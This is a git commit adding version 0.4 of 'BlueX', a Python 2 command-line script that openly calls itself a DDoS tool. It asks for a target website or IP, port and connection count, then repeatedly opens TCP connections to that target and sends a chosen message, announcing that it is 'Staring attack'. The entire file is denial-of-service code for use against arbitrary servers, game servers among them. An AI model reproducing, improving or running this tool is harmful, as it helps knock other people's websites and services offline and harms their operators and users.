9c98feacf5d733fb864a0f2269b80de6f6ac06d6
Tomáš Tomovčík <tomovcik.tomas@gmail.com>
2015-12-12 10:40:28 +0100

    Added version 0.4

---
+++ Versions/0.4/linux/BlueX.py
@@ -0,0 +1,64 @@
+import time
+import socket
+import os
+import sys
+import string
+
+def restart_program():
+    python = sys.executable
+    os.execl(python, python, * sys.argv)
+curdir = os.getcwd()
+print ("Checking internet connection...")
+print ("")
+os.system('ping www.google.sk -c 3')
+os.system('clear')
+print ("#######################################")
+print ("#            BlueX 0.4 (Linux)        #")
+print ("#                                     #")
+print ("#######################################")
+print ("")
+print ("Enter IP or Website to DDoS")
+host=raw_input("> ")
+print("")
+print ("--------------------------------------------------")
+print ("Enter port > for HTTP: 80 - default")
+print ("           > for game server enter last 5 numbers")
+print ("           |-> for example 12345")
+port=input( "> " )
+print ("")
+print ("--------------------------------------------------")
+print ("")
+print ("How many connections do you want to send? ")
+print ("Default is 100.")
+conn=input("> ")
+print ("")
+print ("--------------------------------------------------")
+print ("")
+print ("Enter message for server")
+print ("Default: Hello!")
+message=raw_input("> ")
+os.system('clear')
+ip = socket.gethostbyname( host )
+print ( "[BlueX] Staring attack to: "+host +", with IP: "+ ip +"")
+print ("")
+def dos():
+    #pid = os.fork()
+    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        ddos.connect((host, 80))
+        ddos.send( message )
+        ddos.sendto( message, (ip, port) )
+        ddos.send( message );
+    except socket.error, msg:
+        print("[BlueX: 0x100] Error!")
+    print ( "[BlueX: OK!] att.p-80 "+host +" / "+ ip +"")
+    ddos.close()
+for i in range(1, conn):
+    dos()
+os.system('clear')
+print ("-------------------------------------------------------")
+print ("[BlueX: F.OK!] "+host +" with IP: "+ ip +"")
+if __name__ == "__main__":
+    answer = raw_input("Continue? (Y/N)")
+    if answer.strip() in "Y y".split():
+        restart_program()
